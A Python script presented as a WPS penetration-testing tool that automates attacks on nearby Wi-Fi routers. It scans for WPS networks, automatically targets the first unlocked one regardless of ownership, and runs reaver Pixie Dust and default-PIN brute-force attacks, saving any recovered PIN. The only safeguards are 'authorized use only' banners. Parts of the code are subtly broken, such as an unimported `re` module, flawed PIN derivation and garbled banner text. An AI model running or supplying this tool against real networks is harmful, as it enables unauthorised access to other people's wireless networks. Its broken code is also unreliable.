#!/usr/bin/env python3
"""
██████╗ ██╗  ██╗██╗  ██╗███████╗    ██╗  ██╗███████╗███╗   ███╗███████╗
██╔══██╗██║  ██║██║  ██║██╔════╝    ██║  ██║██╔════╝████╗ ████║██╔════╝
██████╔╝███████║███████║█████╗      ███████║█████╗  ██╔████╔██║█████╗  
██╔══██╗██╔══██║██╔══██║██╔══╝      ██╔══██║██╔══╝  ██║╚██╔╝██║██╔══╝  
██║  ██║██║  ██║██║  ██║███████╗    ██║  ██║███████╗██║ ╚═╝ ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝

🔥 WIFI0X0 - Professional WPS Pentest Tool 🔥
⚠️  AUTHORIZED USE ONLY ⚠️
"""

import sys, os, subprocess, time, signal, shutil, tempfile, pathlib, statistics, collections
from datetime import datetime
from typing import List, Dict

now = datetime.now()
now_time = now.strftime("%d/%m/%Y - %H:%M:%S")

class WIFI0X0:
    def __init__(self, interface="wifi0x0"):
        self.interface = interface
        self.running = True
        self.results = []
        self.tempdir = None
        
        # ANSI Colors
        self.colors = {
            'green': '\033[1;32m', 'red': '\033[1;31m', 'yellow': '\033[1;33m',
            'blue': '\033[1;34m', 'purple': '\033[1;35m', 'cyan': '\033[1;36m',
            'white': '\033[1;37m', 'reset': '\033[0m', 'bold': '\033[1m'
        }
        
        self.banner()

    def banner(self):
        banner = f"""
{self.colors['cyan']}{self.colors['bold']}
    ██╗  ██╗██╗  ██╗███████╗██████╗     ██████╗  ██████╗ ███╗   ███╗███████╗
    ██║  ██║██║  ██║██╔════╝██╔══██╗    ██╔══██╗██╔═══██╗████╗ ████║██╔════╝
    ███████║███████║█████╗  ██████╔╝    ██║  ██║██║   ██║██╔████╔██║█████╗  
    ██╔══██║██╔══██║██╔══╝  ██╔══██╗    ██║  ██║██║   ██║██║╚██╔╝██║██╔══╝  
    ██║  ██║██║  ██║███████╗██║  ██║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚══════╝
{self.colors['reset']}{self.colors['yellow']}
        Professional WPS Penetration Testing Tool
        Interface: {self.interface} | {now_time}
        {self.colors['red']}⚠️  AUTHORIZED TESTING ONLY ⚠️{self.colors['reset']}
        """
        print(banner)

    def check_deps(self):
        """Check dependencies"""
        deps = ['airmon-ng', 'wash', 'reaver', 'wpa_supplicant']
        missing = []
        for dep in deps:
            if subprocess.call(['which', dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                missing.append(dep)
        
        if missing:
            print(f"{self.colors['red']}[!] Missing: {' '.join(missing)}{self.colors['reset']}")
            print(f"{self.colors['yellow']}$ sudo apt install aircrack-ng reaver wash{self.colors['reset']}")
            return False
        print(f"{self.colors['green']}[✓] All dependencies OK{self.colors['reset']}")
        return True

    def setup_interface(self):
        """Setup monitor mode"""
        print(f"{self.colors['yellow']}[*] Setting up {self.interface}...{self.colors['reset']}")
        
        # Kill interfering processes
        subprocess.run(['airmon-ng', 'check', 'kill'], check=False)
        
        # Ensure monitor mode
        result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
        if "Mode:Monitor" not in result.stdout:
            print(f"{self.colors['red']}[!] {self.interface} not in monitor mode!{self.colors['reset']}")
            print(f"{self.colors['yellow']}$ sudo airmon-ng start wlan0{self.colors['reset']}")
            return False
        
        print(f"{self.colors['green']}[✓] {self.interface} ready{self.colors['reset']}")
        return True

    def scan_wps(self) -> List[Dict]:
        """Scan WPS networks"""
        print(f"{self.colors['yellow']}[*] Scanning WPS networks (30s)...{self.colors['reset']}")
        try:
            result = subprocess.run(['wash', '-i', self.interface], 
                                  capture_output=True, text=True, timeout=30)
            
            networks = []
            for line in result.stdout.split('\n')[2:]:  # Skip header
                parts = line.split()
                if len(parts) >= 8 and parts[5] == '2.0':
                    networks.append({
                        'bssid': parts[0],
                        'ssid': parts[1],
                        'channel': parts[3],
                        'signal': parts[4],
                        'wps': parts[5],
                        'locked': parts[6] == 'Yes'
                    })
            return networks
        except Exception as e:
            print(f"{self.colors['red']}[!] Scan failed: {e}{self.colors['reset']}")
            return []

    def pixie_dust(self, bssid: str) -> bool:
        """Pixie Dust Attack"""
        print(f"{self.colors['purple']}[✨] Pixie Dust on {bssid}...{self.colors['reset']}")
        cmd = ['reaver', '-i', self.interface, '-b', bssid, '-K', '1', '-vv', '-T', '0.1']
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, _ = proc.communicate(timeout=45)
            
            if "WPS PIN:" in stdout and "Success" in stdout:
                pin = re.search(r'WPS PIN: \'(\d{8})\'', stdout)
                if pin:
                    self.save_result(bssid, pin.group(1), "Pixie Dust")
                    print(f"{self.colors['green']}[🎉] PIXIE DUST SUCCESS: {pin.group(1)}{self.colors['reset']}")
                    return True
        except:
            pass
        return False

    def smart_pins(self, mac: str) -> List[str]:
        """Generate smart WPS pins"""
        mac_obj = NetworkAddress(mac)
        
        pins = [
            f"{mac_obj.integer & 0xFFFFFF:07d}{WPSpin.checksum(mac_obj.integer & 0xFFFFFF):1d}".zfill(8),
            "12345670", "00000000", "12345678", "11111111"
        ]
        return pins

    def bruteforce(self, bssid: str, mac: str) -> bool:
        """Smart bruteforce"""
        pins = self.smart_pins(mac)
        print(f"{self.colors['yellow']}[⚡] Testing {len(pins)} smart PINs...{self.colors['reset']}")
        
        for i, pin in enumerate(pins):
            print(f"[{i+1:02d}/{len(pins)}] {self.colors['cyan']}{pin}{self.colors['reset']}", end=" ")
            
            cmd = ['reaver', '-i', self.interface, '-b', bssid, '-p', pin, '-vv', '-T', '0.1', '-N']
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
                if "WPS PIN" in result.stdout and ("Success" in result.stdout or "Assoc" in result.stdout):
                    self.save_result(bssid, pin, "Bruteforce")
                    print(f"{self.colors['green']}[✅ FOUND: {pin}]{self.colors['reset']}")
                    return True
            except:
                pass
            print("⏳", end="\r")
            time.sleep(0.3)
        
        print(f"{self.colors['red']}[❌] No PIN found{self.colors['reset']}")
        return False

    def save_result(self, bssid: str, pin: str, method: str):
        """Save results"""
        os.makedirs("wifi0x0_results", exist_ok=True)
        filename = f"wifi0x0_results/{now.strftime('%Y%m%d_%H%M%S')}_{bssid.replace(':','')}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"WIFI0X0 PENTEST RESULT\n")
            f.write(f"Time: {now_time}\n")
            f.write(f"Interface: {self.interface}\n")
            f.write(f"BSSID: {bssid}\n")
            f.write(f"PIN: {pin}\n")
            f.write(f"Method: {method}\n")
            f.write(f"Status: SUCCESS ✅\n")
        
        print(f"{self.colors['green']}[💾] Saved: {filename}{self.colors['reset']}")

    def attack(self):
        """Main attack sequence"""
        if not self.check_deps() or not self.setup_interface():
            return False
        
        networks = self.scan_wps()
        if not networks:
            print(f"{self.colors['red']}[!] No WPS networks found{self.colors['reset']}")
            return False
        
        print(f"{self.colors['green']}[🎯] Found {len(networks)} WPS target(s):{self.colors['reset']}")
        for i, net in enumerate(networks[:3], 1):  # Top 3
            lock = "🔒" if net['locked'] else "🔓"
            print(f"  {i}. {net['bssid']} | {net['ssid']} {lock} ({net['signal']}dB)")
        
        # Attack first unlocked target
        target = next((n for n in networks if not n['locked']), networks[0])
        bssid, mac = target['bssid'], target['bssid']
        
        print(f"\n{self.colors['purple']}[🚀] Attacking {bssid}...{self.colors['reset']}")
        
        # 1. Pixie Dust (fastest)
        if self.pixie_dust(bssid):
            return True
        
        # 2. Smart bruteforce
        time.sleep(2)
        return self.bruteforce(bssid, mac)

    def run(self):
        """Execute full attack"""
        signal.signal(signal.SIGINT, lambda s,f: setattr(self, 'running', False))
        
        try:
            success = self.attack()
            status = "🎉 MISSION ACCOMPLISHED!" if success else "❌ NO VULNERABILITIES"
            print(f"\n{self.colors['bold']}{self.colors['purple']}{'='*60}")
            print(f"     {status}")
            print(f"     Time: {now_time} | Interface: {self.interface}")
            print(f"{'='*60}{self.colors['reset']}")
            
        except KeyboardInterrupt:
            print(f"\n{self.colors['yellow']}[⏹️] Stopped by user{self.colors['reset']}")
        finally:
            self.cleanup()

    def cleanup(self):
        subprocess.run(['airmon-ng', 'stop', self.interface], check=False)
        print(f"{self.colors['green']}[🧹] Cleanup complete{self.colors['reset']}")

# NetworkAddress & WPSpin classes from previous code (abbreviated)
class NetworkAddress:
    def __init__(self, mac): 
        self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
        self._int_repr = int(self._str_repr.replace(':', ''), 16)
    
    @property
    def integer(self): return self._int_repr

class WPSpin:
    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += 3 * (pin % 10)
            pin = int(pin / 10)
            accum += pin % 10
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

if __name__ == "__main__":
    print("🔥 Starting WIFI0X0...")
    wifi0x0 = WIFI0X0("wifi0x0")
    wifi0x0.run()
